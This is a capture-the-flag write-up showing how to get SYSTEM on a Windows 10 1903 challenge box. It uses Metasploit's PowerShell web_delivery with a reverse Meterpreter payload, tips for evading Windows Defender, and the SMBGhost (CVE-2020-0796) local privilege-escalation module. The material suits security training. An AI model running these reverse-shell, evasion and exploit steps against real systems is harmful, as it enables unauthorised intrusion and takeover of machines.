# So I fucked up a bit

Windows Defender turned itself on constantly (like any decent AV), and made the challenge way harder than it was intended to be. As such, it's way out of your league. But I'll still make a writeup to explain it.

# Requirements

You need the latest (or at least reasonably new) Metasploit version. I will also assume you completed Fluffy II and fully understand the RCE vulnerability in this box.

# Summary

The exploit to use is CVE 2020 0796. 

# Down to the actual steps to SYSTEM

## Getting the initial Metasploit Session

First, let's open Metasploit

```bash
msfconsole
```

Windows Defender is very capable of detecting file payloads, so let's instead use Powershell to inject Meterpreter.

```msfconsole
use exploit/multi/script/web_delivery
```

Let's set this up

```msfconsole
set target PSH    //Set target to Powershell
set payload windows/x64/meterpreter/reverse_tcp_rc4     //If you must use meterpreter, always use rc4 to avoid detection.
```

*Sidenote: Remember why you can't use reverse shells with your house router. Check out how to fix this in Scriptures*

Let's check our options
```
options
```
![alt text](https://imgur.com/6Nwqpet.png)
*You don't need to follow my ports and ip. But make sure you change rc4password.*

So now we're good to go.

```msfconsole
run
```
This will give us a command. Execute this command on the website

![alt text](https://imgur.com/zsSWluL.png)

Now we have our first Metasploit session. Standard Operating Procedure. This will work on most windows targets.

## The actual exploit

Let's attach to the session (so you should see a meterpreter> prefix). Let's check sysinfo to see the windows version we're dealing with.

![alt text](https://imgur.com/d5QP00S.png)

Windows Build 18362 hmm? Let's google that.

![alt text](https://imgur.com/xFOtM69.png)

So it's version 1903, released in May 2019. Cool. 

Let's start with a crappy metasploit search

```msfconsole
search type:exploit platform:windows 1903
```
*I call this a crappy search, because it will omit a lot of working results because of bad documentation. But if it works, good for you.*

![alt text](https://imgur.com/fB5HYCu.png)
*Ah yes. An exploit from 2006. Crappy search. But hey, we have a 2020 exploit. Let's check it out*

```msfconsole
info exploit/windows/local/cve_2020_0796_smbghost
```
Output:
```
       Name: SMBv3 Compression Buffer Overflow
     Module: exploit/windows/local/cve_2020_0796_smbghost
   Platform: Windows
       Arch: x86, x64
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2020-03-13

Provided by:
  Daniel García Gutiérrez
  Manuel Blanco Parajón
  Spencer McIntyre

Module stability:
 crash-os-restarts

Module reliability:
 repeatable-session

Available targets:
  Id  Name
  --  ----
  0   Windows 10 v1903-1909 x64

Check supported:
  Yes

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SESSION                   yes       The session to run this module on.

Payload information:

Description:
  A vulnerability exists within the Microsoft Server Message Block
  3.1.1 (SMBv3) protocol that can be leveraged to execute code on a
  vulnerable server. This local exploit implementation leverages this
  flaw to elevate itself before injecting a payload into winlogon.exe.

References:
  https://cvedetails.com/cve/CVE-2020-0796/
  https://github.com/danigargu/CVE-2020-0796
  https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/adv200005
  ```

So this exploit will use the SMB protocol to execute privileged code, and works on v1903 to 1909. If we're lucky this should be sufficient.
Let's set it up.

![alt text](https://imgur.com/1JCBGYM.png)

*Set the session, port and ip relative to yourself.*

Now, let's run it!

![alt text](https://imgur.com/zRFmctM.png)

Ah. A little rough, our first session got killed by Defender. But hey, we managed to get a new session. Let's check it.

*There may be a freeze. Just Ctrl-C.*

Let's attach to that session with the ``sessions <id>`` command.

Let's check getuid...

![alt text](https://imgur.com/S4Sp3kG.png)

Rooted. We're done.

![alt text](https://imgur.com/rtaNibm.png)


# Just a Footnote

There are many ways to reach System. Comahawk is a vulnerability that also works (But not the one in metasploit because it gets flagged by Windows Defender)

This answer is definitely not the best, because if anything gets killed by Defender, the victim will be alerted. So that's no bueno

This tutorial assumes that you know just a little bit about metasploit, so it's not truly a step by step tutorial, just that it shows the general idea of things. If you don't understand something, pester Leonard.

